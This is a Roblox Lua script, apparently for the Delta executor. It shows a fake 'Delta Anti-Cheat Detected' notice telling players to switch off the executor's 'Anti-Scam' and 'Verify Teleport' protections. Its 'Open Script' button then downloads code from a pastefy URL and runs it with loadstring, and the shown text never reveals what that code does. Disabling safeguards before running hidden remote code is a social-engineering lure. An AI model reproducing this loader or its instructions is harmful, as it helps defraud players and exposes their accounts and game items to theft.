local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local player = Players.LocalPlayer

-- 🗑️ Destroy old GUI if it exists
if player.PlayerGui:FindFirstChild("DeltaGui") then
    player.PlayerGui.DeltaGui:Destroy()
end

-- 📌 New ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "DeltaGui"
gui.Parent = player.PlayerGui
gui.ResetOnSpawn = false

-- 📦 Main Frame (Top Placement with height 240)
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 500, 0, 240) -- width 500, height 240
frame.Position = UDim2.new(0.5, 0, 0, 5) -- top of screen (5px down from Roblox bar)
frame.AnchorPoint = Vector2.new(0.5, 0) -- anchored from top center
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

-- 🟨 Yellow Top Bar
local topBar = Instance.new("TextLabel", frame)
topBar.Size = UDim2.new(1, 0, 0, 32)
topBar.BackgroundColor3 = Color3.fromRGB(255, 204, 0)
topBar.Font = Enum.Font.GothamBold
topBar.TextSize = 12
topBar.TextColor3 = Color3.fromRGB(0,0,0)
topBar.TextWrapped = true
topBar.Text = "Turn off your Anti Scam & Verify Teleport to avoid getting banned or disconnected."
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 12)

-- 🏷️ Title
local title = Instance.new("TextLabel", frame)
title.Position = UDim2.new(0,0,0,40)
title.Size = UDim2.new(1,0,0,25)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Text = "Delta Anti-Cheat Detected"

-- 📖 Instructions
local instructions = Instance.new("TextLabel", frame)
instructions.Position = UDim2.new(0,15,0,70)
instructions.Size = UDim2.new(1,-30,1,-120)
instructions.BackgroundTransparency = 1
instructions.Font = Enum.Font.Gotham
instructions.TextSize = 13
instructions.TextColor3 = Color3.fromRGB(230,230,230)
instructions.TextWrapped = true
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.RichText = true
instructions.Text = [[
The script requires teleport permission, which is currently blocked by Delta's <font color="rgb(255,255,0)">Anti-Cheat</font>.
1) Tap the Delta icon at the top.
2) Open Settings (gear icon).
3) Turn <font color="rgb(255,0,0)">OFF</font> the "<font color="rgb(255,255,0)">Anti-Scam</font>" & "<font color="rgb(0,180,255)">Verify Teleport</font>" option.
4) Rejoin and run the script again.
]]

-- 📂 Buttons Frame
local btnFrame = Instance.new("Frame", frame)
btnFrame.Size = UDim2.new(1, -30, 0, 45)
btnFrame.Position = UDim2.new(0, 15, 1, -55)
btnFrame.BackgroundTransparency = 1

-- 🔘 Gray Button (Countdown)
local grayBtn = Instance.new("TextButton", btnFrame)
grayBtn.Size = UDim2.new(0.5, -5, 1, 0)
grayBtn.Position = UDim2.new(0,0,0,0)
grayBtn.BackgroundColor3 = Color3.fromRGB(140,140,140)
grayBtn.Font = Enum.Font.GothamBold
grayBtn.TextSize = 14
grayBtn.TextColor3 = Color3.fromRGB(255,255,255)
grayBtn.Text = "Click to Open Script (5.0s)"
grayBtn.AutoButtonColor = false
Instance.new("UICorner", grayBtn).CornerRadius = UDim.new(0, 8)

-- 🔵 Blue Button (Rejoin)
local blueBtn = Instance.new("TextButton", btnFrame)
blueBtn.Size = UDim2.new(0.5, -5, 1, 0)
blueBtn.Position = UDim2.new(0.5,5,0,0)
blueBtn.BackgroundColor3 = Color3.fromRGB(0,122,255)
blueBtn.Font = Enum.Font.GothamBold
blueBtn.TextSize = 14
blueBtn.TextColor3 = Color3.fromRGB(255,255,255)
blueBtn.Text = "Rejoin Game"
Instance.new("UICorner", blueBtn).CornerRadius = UDim.new(0, 8)

-- ⏱️ Timer Countdown with decimals + load script
local countdown = 5 -- changed from 20 to 5
task.spawn(function()
    while countdown > 0 do
        grayBtn.Text = string.format("Click to Open Script (%.1fs)", countdown)
        countdown -= 0.1
        task.wait(0.1)
    end
    grayBtn.Text = "Click to Open Script"
    grayBtn.AutoButtonColor = true
    grayBtn.BackgroundColor3 = Color3.fromRGB(90,200,90)

    grayBtn.MouseButton1Click:Connect(function()
        gui:Destroy()
        loadstring(game:HttpGet("https://pastefy.app/Aie2ReUu/raw"))()
    end)
end)

-- 🔁 Rejoin button
blueBtn.MouseButton1Click:Connect(function()
    TeleportService:Teleport(game.PlaceId, player)
end)
